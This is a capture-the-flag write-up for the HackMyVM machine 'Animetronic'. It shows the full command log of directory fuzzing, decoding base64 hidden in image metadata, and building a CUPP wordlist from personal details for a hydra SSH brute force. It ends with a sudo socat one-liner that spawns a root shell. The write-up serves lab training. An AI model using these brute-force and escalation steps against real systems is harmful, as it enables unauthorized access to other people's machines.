# Animetronic

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Animetronic | ziyos | Beginner | HackMyVM |

**Summary:** The exploitation of the Animetronic machine begins with a comprehensive network scan that reveals an Apache web server hosting a dedicated animetronic fan site. A deep directory brute force operation uncovers a hidden staff directory containing an image with embedded metadata. By extracting and decoding a base64 string from the image comments, which revealed an upside-down path name, access is gained to a sensitive internal message and a personal information file. This data is utilized to perform a targeted credential profiling attack using CUPP, resulting in a successful SSH login as the user michael. Once internal access is established, enumeration of the home directory of another user named henry leads to the discovery of a base64-encoded filename hidden within a complex directory structure. Retrieving the password from this file allows for lateral movement to henry, who possesses elevated sudo privileges for the socat utility. The final stage involves leveraging socat to execute a root shell, providing full system compromise and access to the final flag.

---

## Reconnaissance

The initial phase involves identifying the target machine on the local network and performing a full port scan to determine the available attack surface.

1. **Host Discovery**
The network is scanned to find the IP address assigned to the Animetronic VM.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.179 08:00:27:6A:DC:F7 VirtualBox
```

2. **Service Enumeration**
An Nmap scan is executed to identify open ports and the versions of the services running on them.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/animetronic]
└─$ nmap -sC -sV -p- 192.168.100.179
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 07:31 WIB
Nmap scan report for 192.168.100.179
Host is up (0.0022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 59:eb:51:67:e5:6a:9e:c1:4c:4e:c5:da:cd:ab:4c:eb (ECDSA)
|_  256 96:da:61:17:e2:23:ca:70:19:b5:3f:53:b5:5a:02:59 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Animetronic
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.20 seconds
```

## Vulnerability Discovery

The web server is analyzed for hidden directories and files that might provide a foothold.

1. **Directory Fuzzing**
Feroxbuster is used to brute force the web directory structure, uncovering an interesting directory named staffpages.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/animetronic]
└─$ feroxbuster -u http://192.168.100.179 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x php,txt,html,zip,bak -t 20 -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.179/
 🚩  In-Scope Url          │ 192.168.100.179
 🚀  Threads               │ 20
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html, zip, bak]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       52l      202w     2384c http://192.168.100.179/index.html
301      GET        9l       28w      316c http://192.168.100.179/img => http://192.168.100.179/img/
200      GET        4l     1058w    69597c http://192.168.100.179/js/jquery-slim.min.js
200      GET     2761l    15370w  1300870c http://192.168.100.179/img/logo.png
200      GET       42l       81w      781c http://192.168.100.179/css/animetronic.css
200      GET       52l      340w    24172c http://192.168.100.179/img/favicon.ico
200      GET        7l     1513w   144878c http://192.168.100.179/css/bootstrap.min.css
200      GET       52l      202w     2384c http://192.168.100.179/
301      GET        9l       28w      316c http://192.168.100.179/css => http://192.168.100.179/css/
301      GET        9l       28w      315c http://192.168.100.179/js => http://192.168.100.179/js/
301      GET        9l       28w      323c http://192.168.100.179/staffpages => http://192.168.100.179/staffpages/
[##>-----------------] - 20m   844027/7642980 3h      found:11      errors:0
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_100_179_-1778033015.state ...
```

2. **Enumerating Staff Pages**
Further investigation into the staffpages directory reveals a file named new_employees.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/animetronic]
└─$ feroxbuster -u http://192.168.100.179/staffpages/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x php,txt,html,zip,bak -t 20 -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.179/staffpages
 🚩  In-Scope Url          │ 192.168.100.179
 🚀  Threads               │ 20
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html, zip, bak]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      323c http://192.168.100.179/staffpages => http://192.168.100.179/staffpages/
200      GET      728l     3824w   287818c http://192.168.100.179/staffpages/new_employees
[###>----------------] - 26m  1163490/7642914 3h      found:2       errors:0
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_100_179_staffpages-1778034660.state ...
```

## Exploitation

The discovered file is analyzed to extract potential credentials or further information.

1. **Metadata Analysis**
The new_employees file is downloaded and identified as a JPEG image. Metadata analysis reveals a hidden comment intended for michael.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/animetronic]
└─$ wget http://192.168.100.179/staffpages/new_employees
--2026-05-06 10:25:20--  http://192.168.100.179/staffpages/new_employees
Connecting to 192.168.100.179:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 159577 (156K)
Saving to: ‘new_employees’

new_employees                            100%[================================================================================>] 155.84K  --.-KB/s    in 0.007s

2026-05-06 10:25:20 (22.7 MB/s) - ‘new_employees’ saved [159577/159577]


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/animetronic]
└─$ file new_employees
new_employees: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "page for you michael : ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=", progressive, precision 8, 703x1136, components 3

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/animetronic]
└─$ exiftool new_employees
ExifTool Version Number         : 13.36
File Name                       : new_employees
Directory                       : .
File Size                       : 160 kB
File Modification Date/Time     : 2023:11:28 00:11:43+07:00
File Access Date/Time           : 2026:05:06 10:25:26+07:00
File Inode Change Date/Time     : 2026:05:06 10:25:20+07:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : page for you michael : ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=
Image Width                     : 703
Image Height                    : 1136
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 703x1136
Megapixels                      : 0.799
```

2. **Decoding Hidden Information**
The base64 string from the comment is decoded, revealing a path written in upside-down characters.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/animetronic]
└─$ echo 'ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=' | base64 -d
ɯǝssɐƃǝ‾ɟoɹ‾ɯıɔɥɐǝן
```

The decoded string translates to message_for_michael. Accessing this path provides instructions regarding a password hint based on personal information.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/animetronic]
└─$ curl -s http://192.168.100.179/staffpages/message_for_michael
Hi Michael

Sorry for this complicated way of sending messages between us.
This is because I assigned a powerful hacker to try to hack
our server.

By the way, try changing your password because it is easy
to discover, as it is a mixture of your personal information
contained in this file

personal_info.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/animetronic]
└─$ curl -s http://192.168.100.179/staffpages/personal_info.txt
name: Michael

age: 27

birth date: 19/10/1996

number of children: 3 " Ahmed - Yasser - Adam "

Hobbies: swimming
```

3. **Credential Profiling and Brute Force**
Using the personal details found, a custom wordlist is generated with CUPP. Subsequently, a brute force attack against the SSH service is performed.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/animetronic]
└─$ cupp -i
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Michael
> Surname:
> Nickname:
> Birthdate (DDMMYYYY): 19101996


> Partners) name:
> Partners) nickname:
> Partners) birthdate (DDMMYYYY):


> Child's name: Ahmed - Yasser - Adam
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name:
> Company name:


> Do you want to add some key words about the victim? Y/[N]: y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: swimming
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to michael.txt, counting 5548 words.
> Hyperspeed Print? (Y/n) : n
[+] Now load your pistolero with michael.txt and shoot! Good luck!

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/animetronic]
└─$ wc -l michael.txt
5547 michael.txt
```

The SSH service is successfully breached using the generated wordlist.

```bash
──(ouba㉿CLIENT-DESKTOP)-[/tmp/animetronic]
└─$ hydra -l michael -P ./michael.txt ssh://192.168.100.179
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-06 10:33:40
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 5548 login tries (l:1/p:5548), ~347 tries per task
[DATA] attacking ssh://192.168.100.179:22/
[STATUS] 229.00 tries/min, 229 tries in 00:01h, 5321 to do in 00:24h, 14 active
[STATUS] 233.00 tries/min, 699 tries in 00:03h, 4851 to do in 00:21h, 14 active
[STATUS] 218.29 tries/min, 1528 tries in 00:07h, 4023 to do in 00:19h, 13 active
[STATUS] 204.83 tries/min, 2458 tries in 00:12h, 3095 to do in 00:16h, 11 active
[STATUS] 196.35 tries/min, 3338 tries in 00:17h, 2215 to do in 00:12h, 11 active
[22][ssh] host: 192.168.100.179   login: michael   password: l[REDACTED]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-06 10:55:23
```

## Internal Enumeration

After logging in as michael, the system is explored to identify potential paths for lateral movement.

1. **System Access**
The initial shell is established via SSH.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/animetronic]
└─$ ssh michael@192.168.100.179
michael@192.168.100.179's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Nov 27 21:01:13 2023 from 10.0.2.6
michael@animetronic:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael)
```

2. **Lateral Movement to Henry**
A review of the home directory of another user, henry, reveals a note mentioning a hidden password file.

```bash
michael@animetronic:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
henry:x:1000:1000:Hanry:/home/henry:/bin/bash
michael:x:1001:1001::/home/michael:/usr/bin/bash
michael@animetronic:~$ ls -la /home/henry/
total 56
drwxrwxr-x   6 henry henry  4096 Nov 27  2023 .
drwxr-xr-x   4 root  root   4096 Nov 27  2023 ..
-rwxrwxr-x   1 henry henry    30 Jan  5  2024 .bash_history
-rwxrwxr-x   1 henry henry   220 Jan  6  2022 .bash_logout
-rwxrwxr-x   1 henry henry  3771 Jan  6  2022 .bashrc
drwxrwxr-x   2 henry henry  4096 Nov 27  2023 .cache
drwxrwxr-x   3 henry henry  4096 Nov 27  2023 .local
drwxrwxr-x 402 henry henry 12288 Nov 27  2023 .new_folder
-rwxrwxr-x   1 henry henry   807 Jan  6  2022 .profile
drwxrwxr-x   2 henry henry  4096 Nov 27  2023 .ssh
-rwxrwxr-x   1 henry henry     0 Nov 27  2023 .sudo_as_admin_successful
-rwxrwxr-x   1 henry henry   119 Nov 27  2023 Note.txt
-rwxrwxr-x   1 henry henry    33 Nov 27  2023 user.txt

michael@animetronic:~$ cd /home/henry/
michael@animetronic:/home/henry$ cat Note.txt
if you need my account to do anything on the server,
you will find my password in file named

aGVucnlwYXNzd29yZC50eHQK
```

The filename is base64 encoded. Decoding it gives henrypassword.txt. This file is found deep within the .new_folder directory.

```bash
michael@animetronic:/home/henry$ echo 'aGVucnlwYXNzd29yZC50eHQK' | base64 -d
henrypassword.txt
michael@animetronic:/home/henry$ find . -type f -name "henrypassword.txt" 2>/dev/null
./.new_folder/dir289/dir26/dir10/henrypassword.txt
michael@animetronic:/home/henry$ cat ./.new_folder/dir289/dir26/dir10/henrypassword.txt
I[REDACTED]
```

## Privilege Escalation

With the password for henry obtained, the final step involves escalating privileges to root.

1. **Sudo Privileges**
Checking sudo permissions for henry reveals that the user can execute socat as root without a password.

```bash
michael@animetronic:/home/henry$ su - henry
Password:
henry@animetronic:~$ id
uid=1000(henry) gid=1000(henry) groups=1000(henry),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
henry@animetronic:~$ sudo -l
Matching Defaults entries for henry on animetronic:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User henry may run the following commands on animetronic:
    (root) NOPASSWD: /usr/bin/socat
```

2. **Root Access via Socat**
The socat utility is leveraged to spawn a root shell, as documented on GTFOBins.

![alt text](image.png)

```bash
henry@animetronic:~$ sudo -u root socat - exec:/bin/sh,pty,ctty,raw,echo=0
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
animetronic
# whoami
root
```

The exploitation is complete, and both the user and root flags are retrieved.

```bash
# cat /home/henry/user.txt
083[REDACTED]
# cat /root/root.txt
153[REDACTED]
```

---

## Attack Chain Summary
1. **Reconnaissance**: Host discovery identified 192.168.100.179 as the target, followed by an Nmap scan revealing HTTP and SSH services.
2. **Vulnerability Discovery**: Directory fuzzing with Feroxbuster uncovered a staff directory containing an image with hidden metadata comments.
3. **Exploitation**: Decoded base64 metadata revealed an upside-down path, leading to personal information used to generate a wordlist for an SSH brute force breach as user michael.
4. **Internal Enumeration**: Discovery of a base64-encoded filename in a note led to finding the password for user henry hidden deep within a nested directory structure.
5. **Privilege Escalation**: Exploited a NOPASSWD sudo permission for socat to execute a root shell and capture the final flag.
